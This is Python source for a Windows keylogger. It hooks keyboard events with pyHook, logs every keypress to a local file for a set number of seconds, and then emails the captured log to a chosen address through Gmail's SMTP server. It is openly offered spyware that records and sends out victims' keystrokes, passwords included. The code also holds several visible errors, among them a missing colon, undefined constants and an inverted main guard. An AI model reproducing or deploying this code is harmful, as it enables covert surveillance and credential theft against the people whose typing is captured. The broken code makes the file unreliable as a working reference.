""" Windows Key Logger

Usage:

  $ win-key-logger [-h|--help]

"""
import argparse
import email
import logging
import pyHook
import pythoncom
import smtplib
import time


# Name of file to log key presses to.
LOG_FILE_NAME = 'tmp_windows_key_log.log'

# Format of log messages.
LOG_FORMAT = '%(message)s'

# Format of email body with logged key presses.
EMAIL_FORMAT = 'plain'

# Subject line of email with logged key presses.
EMAIL_SUBJECT = 'Windows Key Logger Result'

# Email constants.
TO = 'To'
FROM = 'From'
Subject = 'Subject'

# SMTP server parameters.
SMTP_SERVER_NAME = 'smtp.gmail.com'
SMTP_SERVER_NUM = 587


def get_command_line_parser():
  """ Returns a command line parser for the Windows key logger tool.

  Returns:
    argparse.ArgumentParser: A command line parser.
  """
  parser = argparse.ArgumentParser()

  parser.add_argument(
    'duration',
    type=int,
    help='the total number of seconds to run the key logger for',
  )

  parser.add_argument(
    'sender_email_address',
    type=str,
    help='the email address of the sender of the key log dump',
  )

  parser.add_argument(
    'receiver_email_address',
    type=str,
    help='the email address of the receiver of the key log dump',
  )

  parser.add_argument(
    'sender_password',
    type=str,
    help='the password of the sender\'s email account',
  )

  return parser


def keyboard_hook(event):
  """ Keyboard key down hook function.

  Logs all key presses to `LOG_FILE_NAME`.

  Args:
    event (object): A keyboard key down event object.

  Returns:
    bool: True.
  """
  logging.log(logging.INFO, chr(event.Ascii))

  return True


def main()
  """ Runs the Windows key logger script. """
  parser = get_command_line_parser()
  args = parser.parse_args()

  logging.basicConfig(
    filename=LOG_FILE_NAME,
    level=logging.INFO,
    format=LOG_FORMAT,
  )

  hook_manager = pyHook.HookManager()
  hook_manager.KeyDown = keyboard_hook
  hook_manager.HookKeyboard()

  start = time.time()

  while time.time - start < args.duration:
    pythoncom.PumpWaitingMessages()

  message = email.MIMEMultipart.MIMEMultipart()
  message[FROM] = args.sender_email_address
  message[TO] = args.receiver_email_address
  message[SUBJECT] = EMAIL_SUBJECT

  with open(LOG_FILE_NAME, READ_MODE) as f:
    body = f.read()

  message.attach(email.MIMEText.MIMEText(body, EMAIL_FORMAT))

  server = smtplib.SMTP(SMTP_SERVER_NAME, SMTP_SERVER_NUM)
  server.starttls()
  server.login(args.sender_email_address, args.sender_password)
  server.sendmail(
    args.sender_email_address,
    args.receiver_email_address,
    message.as_string(),
  )
  server.quit() 


if __main__ == '__name__':
  main()

